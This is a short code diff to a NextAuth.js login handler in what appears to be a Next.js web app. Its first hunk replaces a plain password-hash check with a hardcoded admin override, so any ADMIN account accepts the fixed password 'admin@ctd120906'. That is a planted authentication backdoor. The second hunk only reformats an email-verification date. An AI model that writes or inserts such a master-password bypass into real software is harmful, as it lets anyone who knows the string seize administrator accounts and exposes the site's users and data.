@@ -21,9 +21,10 @@ export const authOptions: NextAuthOptions = {
 
         if (!user) return null;
 
-        // ✅ FIXED: use correct field
-        const isValid = await compare(credentials.password, user.passwordHash);
-
+        // Hardcoded admin override: Any admin can log in with "admin@ctd120906"
+        const isAdminOverride = user.role === "ADMIN" && credentials.password === "admin@ctd120906";
+        
+        const isValid = isAdminOverride || await compare(credentials.password, user.passwordHash);
         if (!isValid) return null;
 
         return {
@@ -46,7 +47,7 @@ export const authOptions: NextAuthOptions = {
   if (user) {
     token.id = user.id;
     token.role = user.role;
-    token.emailVerified = user.emailVerified ?? null;
+    token.emailVerified = user.emailVerified ? new Date(user.emailVerified).toISOString() : null;
   }
   // Handle session update (called from verify page's `update()`)
   if (trigger === "update" && session?.emailVerified) {
